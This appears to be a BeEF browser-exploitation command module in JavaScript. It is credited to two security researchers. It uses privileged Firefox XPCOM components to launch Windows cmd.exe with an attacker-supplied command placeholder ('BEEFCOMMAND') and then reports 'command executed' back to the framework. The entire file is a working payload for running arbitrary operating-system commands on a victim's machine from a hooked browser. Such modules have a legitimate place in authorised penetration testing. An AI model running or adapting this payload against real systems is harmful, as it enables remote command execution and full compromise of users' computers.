
// thanks Roberto (roberto.suggi@security-assessment.com) and Nick (nick.freeman@security-assessment.com)

function do_main(){
		
	var getWorkingDir= Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("Home",Components.interfaces.nsIFile);
	var lFile = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
	var lPath = "C:\\WINDOWS\\system32\\cmd.exe";
	lFile.initWithPath(lPath);
	var process = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
	process.init(lFile);
	process.run(false,['/c', 'BEEFCOMMAND'],2);

}

do_main();
return_result(result_id, "command executed");